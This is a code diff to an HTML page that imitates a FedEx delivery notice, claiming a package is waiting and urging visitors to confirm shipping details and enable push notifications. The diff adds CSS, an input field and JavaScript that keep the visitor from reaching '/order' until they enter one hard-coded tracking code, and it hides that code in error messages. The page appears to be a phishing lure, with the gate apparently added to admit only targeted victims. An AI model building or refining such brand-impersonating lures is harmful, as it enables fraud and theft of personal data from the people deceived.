@@ -73,7 +73,11 @@
     cursor: pointer;
     white-space: nowrap;
   }
-  button.continue-btn:hover {
+  button.continue-btn:disabled {
+    background-color: #cccccc;
+    cursor: not-allowed;
+  }
+  button.continue-btn:hover:not(:disabled) {
     background-color: #e56300;
   }
   .white-section {
@@ -88,15 +92,35 @@
     margin: 0 auto 15px auto;
     line-height: 1.4;
   }
-  .tracking-code {
-    background: #ddd;
-    border-radius: 4px;
-    width: 175px;
-    margin: 10px auto 20px auto;
-    font-weight: 700;
-    color: #1c1c1c;
+  .tracking-input-container {
+    margin: 15px auto 20px auto;
+    max-width: 300px;
+  }
+  .tracking-label {
+    display: block;
+    font-weight: bold;
+    margin-bottom: 8px;
+    color: #333;
+  }
+  .tracking-input {
+    width: 100%;
+    padding: 12px 15px;
     font-size: 16px;
-    padding: 10px 0;
+    border: 2px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+    text-align: center;
+    font-weight: bold;
+    color: #1c1c1c;
+    transition: border-color 0.3s;
+  }
+  .tracking-input:focus {
+    border-color: #fa6d00;
+    outline: none;
+  }
+  .tracking-input.error {
+    border-color: #ff0000;
+    background-color: #fff8f8;
   }
   button.schedule-btn {
     background-color: #fa6d00;
@@ -107,8 +131,13 @@
     color: white;
     border-radius: 4px;
     cursor: pointer;
+    margin-top: 10px;
   }
-  button.schedule-btn:hover {
+  button.schedule-btn:disabled {
+    background-color: #cccccc;
+    cursor: not-allowed;
+  }
+  button.schedule-btn:hover:not(:disabled) {
     background-color: #e56300;
   }
   .footer {
@@ -122,6 +151,47 @@
     color: #666;
     text-decoration: underline;
   }
+  
+  /* Notification styles */
+  .notification {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    padding: 15px 20px;
+    border-radius: 5px;
+    color: white;
+    font-weight: bold;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    z-index: 1000;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    max-width: 350px;
+    animation: slideIn 0.3s ease-out;
+  }
+  .notification.error {
+    background-color: #e74c3c;
+    border-left: 5px solid #c0392b;
+  }
+  .notification .close-btn {
+    background: none;
+    border: none;
+    color: white;
+    font-size: 20px;
+    cursor: pointer;
+    margin-left: 15px;
+    line-height: 1;
+  }
+  @keyframes slideIn {
+    from {
+      transform: translateX(100%);
+      opacity: 0;
+    }
+    to {
+      transform: translateX(0);
+      opacity: 1;
+    }
+  }
 </style>
 </head>
 <body>
@@ -134,15 +204,26 @@
       <div class="fedex-logo" aria-label="FedEx logo">FEDEX</div>
       <h2>You have (1) package waiting for delivery.</h2>
       <p class="subtext">Confirm your shipping details</p>
-      <button class="continue-btn" aria-label="Continue to confirm shipping details" onclick="redirectToOrder()">CONTINUE</button>
+      <button class="continue-btn" aria-label="Continue to confirm shipping details" id="continueBtn" disabled>CONTINUE</button>
     </div>
   </section>
 
   <section class="white-section" aria-label="Delivery scheduling and notifications">
     <p>Schedule your delivery and subscribe to our push notifications to avoid this from happening again!</p>
-    <p>Your tracking code:</p>
-    <div class="tracking-code">***********</div>
-    <button class="schedule-btn" aria-label="Schedule your delivery" onclick="redirectToOrder()">SCHEDULE YOUR DELIVERY</button>
+    <p>Please enter your tracking code:</p>
+    
+    <div class="tracking-input-container">
+      <input 
+        type="text" 
+        id="trackingCode" 
+        class="tracking-input" 
+        placeholder="Enter 12-digit tracking code" 
+        maxlength="12"
+        autocomplete="off"
+      />
+    </div>
+    
+    <button class="schedule-btn" aria-label="Schedule your delivery" id="scheduleBtn" disabled>SCHEDULE YOUR DELIVERY</button>
   </section>
 
   <footer class="footer" aria-label="Address and unsubscribe information">
@@ -152,23 +233,136 @@
   </footer>
 
   <script>
-    function redirectToOrder() {
-      // Redirect to order.html
-      window.location.href = '/order';
+    // Correct tracking code for validation
+    const CORRECT_TRACKING_CODE = "272766521948";
+    
+    // DOM elements
+    const trackingInput = document.getElementById('trackingCode');
+    const continueBtn = document.getElementById('continueBtn');
+    const scheduleBtn = document.getElementById('scheduleBtn');
+    
+    // Show notification function
+    function showNotification(message, type = 'error') {
+      // Remove any existing notifications
+      const existingNotification = document.querySelector('.notification');
+      if (existingNotification) {
+        existingNotification.remove();
+      }
+      
+      // Create new notification
+      const notification = document.createElement('div');
+      notification.className = `notification ${type}`;
+      notification.innerHTML = `
+        <span>${message}</span>
+        <button class="close-btn">&times;</button>
+      `;
+      
+      document.body.appendChild(notification);
+      
+      // Add event listener to close button
+      notification.querySelector('.close-btn').addEventListener('click', () => {
+        notification.remove();
+      });
+      
+      // Auto-remove after 3 seconds
+      setTimeout(() => {
+        if (notification.parentNode) {
+          notification.remove();
+        }
+      }, 3000);
     }
     
-    // Optional: Add click event listeners as alternative to onclick attributes
-    document.addEventListener('DOMContentLoaded', function() {
-      // Both buttons will use the same function
-      const continueBtn = document.querySelector('.continue-btn');
-      const scheduleBtn = document.querySelector('.schedule-btn');
+    // Validate tracking code
+    function validateTrackingCode(code) {
+      // Check if it's exactly 12 digits and numeric
+      if (!code || code.length !== 12) {
+        return false;
+      }
       
-      if (continueBtn) {
-        continueBtn.addEventListener('click', redirectToOrder);
+      // Check if it contains only numbers
+      if (!/^\d+$/.test(code)) {
+        return false;
       }
-      if (scheduleBtn) {
-        scheduleBtn.addEventListener('click', redirectToOrder);
+      
+      // Check if it matches the correct code
+      if (code !== CORRECT_TRACKING_CODE) {
+        return false;
       }
+      
+      return true;
+    }
+    
+    // Update button states based on validation
+    function updateButtonState() {
+      const code = trackingInput.value.trim();
+      const isValid = validateTrackingCode(code);
+      
+      if (isValid) {
+        // Enable buttons
+        continueBtn.disabled = false;
+        scheduleBtn.disabled = false;
+        
+        // Remove error styling
+        trackingInput.classList.remove('error');
+      } else {
+        // Disable buttons
+        continueBtn.disabled = true;
+        scheduleBtn.disabled = true;
+        
+        // Add error styling if there's text but it's invalid
+        if (code.length > 0) {
+          trackingInput.classList.add('error');
+        } else {
+          trackingInput.classList.remove('error');
+        }
+      }
+    }
+    
+    // Redirect function - only works if buttons are enabled
+    function redirectToOrder() {
+      const code = trackingInput.value.trim();
+      const isValid = validateTrackingCode(code);
+      
+      if (isValid) {
+        // Redirect to order.html as in original code
+        window.location.href = '/order';
+      } else {
+        // Show generic error message WITHOUT revealing the code
+        showNotification("Invalid tracking code. Please check and try again.");
+        trackingInput.focus();
+      }
+    }
+    
+    // Initialize event listeners
+    document.addEventListener('DOMContentLoaded', function() {
+      // Track input changes
+      trackingInput.addEventListener('input', function() {
+        // Auto-format: only allow digits, limit to 12
+        this.value = this.value.replace(/\D/g, '').slice(0, 12);
+        updateButtonState();
+      });
+      
+      // Add click events to buttons
+      continueBtn.addEventListener('click', redirectToOrder);
+      scheduleBtn.addEventListener('click', redirectToOrder);
+      
+      // Focus on the tracking input when page loads
+      trackingInput.focus();
+      
+      // Show error if Enter is pressed with invalid code
+      trackingInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          const code = trackingInput.value.trim();
+          
+          if (validateTrackingCode(code)) {
+            window.location.href = '/order';
+          } else {
+            // Show generic error message WITHOUT revealing the code
+            showNotification("Invalid tracking code. Please check and try again.");
+          }
+        }
+      });
     });
   </script>
 </body>
